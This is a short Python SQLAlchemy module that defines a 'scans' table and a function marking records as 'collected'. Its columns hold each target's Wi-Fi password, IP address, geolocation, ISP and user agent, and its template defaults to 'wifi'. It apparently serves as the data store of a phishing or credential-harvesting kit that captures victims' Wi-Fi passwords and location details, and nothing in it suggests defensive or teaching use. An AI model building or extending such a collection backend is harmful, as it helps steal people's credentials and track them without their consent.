from sqlalchemy import create_engine, Column, String, Integer, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import uuid
from datetime import datetime
import os

DATABASE_URL = os.getenv("DATABASE_URL")
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(bind=engine)
Base = declarative_base()

class Scan(Base):
    __tablename__ = "scans"
    id = Column(Integer, primary_key=True)
    unique_id = Column(String(36), unique=True)
    template = Column(String(50), default="wifi")
    target = Column(String(255))
    ip_address = Column(String(45))
    user_agent = Column(String(500))
    geolocation = Column(String(100))
    wifi_password = Column(String(255))
    isp_info = Column(String(500))
    status = Column(String(50), default="pending")
    created_at = Column(DateTime, default=datetime.utcnow)

def init_db():
    Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

def save_scan_data(unique_id, data, template="wifi"):
    db = next(get_db())
    scan = db.query(Scan).filter(Scan.unique_id == unique_id).first()
    if scan:
        for key, value in data.items():
            setattr(scan, key, value)
        scan.template = template
        scan.status = 'collected'
        db.commit()
    db.close()
    return bool(scan)
